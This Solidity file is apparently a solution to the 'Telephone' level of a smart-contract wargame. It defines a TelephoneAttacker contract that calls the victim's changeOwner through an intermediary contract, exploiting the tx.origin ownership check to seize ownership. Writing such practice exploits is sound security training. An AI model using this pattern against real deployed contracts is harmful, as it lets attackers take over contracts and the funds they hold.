// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../4-Telephone.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract TelephoneAttacker {
    Telephone victim;
    address owner;

    constructor(address _victimContract, address _owner) public {
        victim = Telephone(_victimContract);
        owner = _owner;
    }

    function attack() external {
        victim.changeOwner(owner);
    }
}
